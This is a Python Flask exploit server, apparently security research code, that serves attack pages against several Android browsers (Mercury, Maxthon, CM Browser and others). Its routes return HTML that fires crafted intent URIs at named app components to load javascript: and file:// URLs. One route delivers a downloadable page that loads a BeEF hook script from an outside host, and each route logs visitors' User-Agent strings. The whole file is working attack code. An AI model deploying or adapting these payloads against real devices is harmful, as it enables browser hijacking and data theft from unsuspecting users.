import os

from datetime import datetime

# Setup Flask
from flask import Flask, request, make_response
app = Flask(__name__)


@app.route('/xss', methods=['GET'])
def xss():

    html = """

        <html>
            <body>
            <h1>Beef Hook!</h1>
                <script src='http://192.168.1.106:3000/hook.js'></script>
            </body>
        </html>

        """

    response = make_response(html)
    response.headers["Content-Disposition"] = "attachment; filename=xss.html"
    return response


@app.route('/intent')
def intent():

    """
    Intent template for testing parseUri()

    """
    exploit = """

        <html>
            <head>
                <meta charset="utf-8" />
                <title>Trigger parseUri()</title>
            </head>
            <body>
                <script>
                location.href="intent:#Intent;action=android.intent.action.VIEW;end";
                </script>
            </body>
        </html>

    """

    return exploit


@app.route('/boat_tablet')
def boat_tablet():

    """
    Template for boat_tablet

    """

    # Get User-Agent from request headers
    user_agent = request.headers.get("User-Agent")

    # Log the User-Agent to a file
    with open(os.path.join("logs/", "boat_tablet-ua-%s" % datetime.now()), "w+") as log:
        print("[%s] Writing Log" % datetime.now())
        log.write(user_agent)
        log.close()

    exploit = """

        <html>
            <head>
                <meta charset="utf-8" />
                <title>Trigger parseUri()</title>
            </head>
            <body>
                <script>
                location.href="intent:#Intent;action=android.intent.action.VIEW;end";
                </script>
            </body>
        </html>

    """

    return exploit


@app.route('/mercury')
def mercury():

    """
    Template for mercury

    """

    # Get User-Agent from request headers
    user_agent = request.headers.get("User-Agent")

    # Log the User-Agent to a file
    with open(os.path.join("logs/", "mercury-ua-%s" % datetime.now()), "w+") as log:
        print("[%s] Writing Log" % datetime.now())
        log.write(user_agent)
        log.close()

    # Exploit #01

    exploit = """

         <html>
            <body>
                <script>
                setTimeout(function ()
                {
                location.href="intent:#Intent;S.url_authorize=file:///sdcard/Mercury/Downloads/xss.html;SEL;component=com.ilegendsoft.mercury/com.ilegendsoft.clouddrive.box.BoxAuthActivity;end";
                }, 5000);
                </script>
                <iframe src='http://192.168.1.106:5000/xss' />
            </body>
        </html>

           """

    # Exploit #02

    """

    <html>
        <body>
            <script>
                location.href="intent:#Intent;S.load=javascript:alert(1);SEL;component=com.ilegendsoft.mercury/com.ilegendsoft.social.common.SimpleWebViewActivity;end";
            </script>
        </body>
    </html>

    """

    return exploit


@app.route('/maxthon')
def maxthon():

    # Get User-Agent from request headers
    user_agent = request.headers.get("User-Agent")

    # Log the User-Agent to a file
    with open(os.path.join("logs/", "maxthon-ua-%s" % datetime.now()), "w+") as log:
        print("[%s] Writing Log" % datetime.now())
        log.write(user_agent)
        log.close()

    exploit = """

         <html>
            <body>
                <script>
                    location.href="intent:#Intent;S.url=javascript:alert(1);SEL;component=com.mx.browser/com.mx.browser.navigation.MxFullscreenWebviewActivity;end";
                </script>
            </body>
        </html>

           """
    return exploit


@app.route('/maxthon_pioneer')
def maxthon_pioneer():

    # Get User-Agent from request headers
    user_agent = request.headers.get("User-Agent")

    # Log the User-Agent to a file
    with open(os.path.join("logs/", "maxthon_pioneer-ua-%s" % datetime.now()), "w+") as log:
        print("[%s] Writing Log" % datetime.now())
        log.write(user_agent)
        log.close()

    exploit = """

            <html>
                <body>
                    <script>
                    location.href="intent:#Intent;action=android.intent.action.VIEW;end";
                    </script>
                </body>
            </html>

           """
    return exploit


@app.route('/baidu')
def baidu():

    # Get User-Agent from request headers
    user_agent = request.headers.get("User-Agent")

    # Log the User-Agent to a file
    with open(os.path.join("logs/", "baidu-ua-%s" % datetime.now()), "w+") as log:
        print("[%s] Writing Log" % datetime.now())
        log.write(user_agent)
        log.close()

    exploit = """

            <html>
                <body>
                    <script>
                    location.href="intent:#Intent;action=android.intent.action.VIEW;end";
                    </script>
                </body>
            </html>

           """
    return exploit


@app.route('/cm')
def cm():

    # Get User-Agent from request headers
    user_agent = request.headers.get("User-Agent")

    # Log the User-Agent to a file
    with open(os.path.join("logs/", "cm-ua-%s" % datetime.now()), "w+") as log:
        print("[%s] Writing Log" % datetime.now())
        log.write(user_agent)
        log.close()

    # Exploit #01

    exploit_01 = """

            <html>
                <body>
                    <script>
                        location.href="intent:#Intent;S.update_btn_right=Update;S.update_url=https://play.google.com/store/apps/details?id=com.netflix.mediaclient&hl=en;SEL;component=com.ksmobile.cb/com.ijinshan.browser.push.PushMsgActivity;end";
                    </script>
                </body>
            </html>

            """

    exploit_02 = """


            <html>
                <body>
                    <script>
                    location.href="intent:#Intent;S.key_extend_url=file:///sdcard/Download/xss.html;SEL;component=com.ksmobile.cb/com.ijinshan.browser.screen.UserAgreementActivity;end";
                    </script>
                </body>
            </html>


            """

    return exploit_02

# Change this as needed
app.debug = True
app.run(host='0.0.0.0')
